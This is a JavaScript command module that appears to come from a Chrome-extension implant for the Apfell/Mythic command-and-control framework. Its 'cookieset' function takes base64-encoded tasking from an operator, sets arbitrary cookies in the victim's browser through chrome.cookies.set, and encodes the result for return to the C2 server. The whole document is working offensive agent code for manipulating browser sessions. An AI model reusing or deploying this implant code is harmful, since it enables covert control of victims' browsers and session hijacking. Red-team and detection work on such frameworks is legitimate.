exports.cookieset = function(task) {
    try {
        let details = JSON.parse(atob(task.parameters.toString()));
        chrome.cookies.set(details, function(cookie){
            let resp;
            if (cookie === null) {
                resp = JSON.stringify(chrome.runtime.lastError);
            } else {
                resp = JSON.stringify(cookie, null, 2);
            }
    
            let response = {'task_id':task.id, 'user_output':resp, 'completed':true};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        });
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
    
};
COMMAND_ENDS_HERE
